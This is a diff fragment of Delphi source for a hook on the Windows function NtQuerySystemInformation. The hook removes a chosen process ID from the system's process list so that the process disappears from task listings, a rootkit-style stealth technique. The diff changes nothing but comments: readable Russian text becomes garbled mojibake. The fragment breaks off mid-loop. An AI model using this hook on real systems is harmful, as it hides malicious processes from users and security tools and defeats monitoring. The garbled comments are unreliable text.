@@ -171,7 +171,7 @@ var
 // - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 
 
-// Функция, которая будет выполнена вместо перехваченной NtQuerySystemInformation:
+// Р¤СѓРЅРєС†РёСЏ, РєРѕС‚РѕСЂР°СЏ Р±СѓРґРµС‚ РІС‹РїРѕР»РЅРµРЅР° РІРјРµСЃС‚Рѕ РїРµСЂРµС…РІР°С‡РµРЅРЅРѕР№ NtQuerySystemInformation:
 function HookedNtQuerySystemInformation(
                                          SystemInformationClass: LongWord;
                                          SystemInformation: PSYSTEM_PROCESS_INFORMATION;
@@ -185,7 +185,7 @@ var
 begin
   Result := TrueNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 
-  // Проверяем случаи, когда изменять результат не надо::
+  // РџСЂРѕРІРµСЂСЏРµРј СЃР»СѓС‡Р°Рё, РєРѕРіРґР° РёР·РјРµРЅСЏС‚СЊ СЂРµР·СѓР»СЊС‚Р°С‚ РЅРµ РЅР°РґРѕ::
   if HookingState or (Result <> 0) then Exit;
   if SystemInformationClass <> LongWord(SystemProcessInformation) then Exit;
 
@@ -204,10 +204,10 @@ begin
 
   while SystemInfo.NextEntryOffset > 0 do
   begin
-    // Если следующий элемент - наш процесс,...:
+    // Р•СЃР»Рё СЃР»РµРґСѓСЋС‰РёР№ СЌР»РµРјРµРЅС‚ - РЅР°С€ РїСЂРѕС†РµСЃСЃ,...:
     if PSYSTEM_PROCESS_INFORMATION(NativeUInt(SystemInfo) + SystemInfo.NextEntryOffset).UniqueProcessId = HidingProcessID then
     begin
-      // ...то скрываем его:
+      // ...С‚Рѕ СЃРєСЂС‹РІР°РµРј РµРіРѕ:
       if PSYSTEM_PROCESS_INFORMATION(NativeUInt(SystemInfo) + SystemInfo.NextEntryOffset).NextEntryOffset <> 0 then
         SystemInfo.NextEntryOffset := PSYSTEM_PROCESS_INFORMATION(NativeUInt(SystemInfo) + SystemInfo.NextEntryOffset).NextEntryOffset + SystemInfo.NextEntryOffset
       else
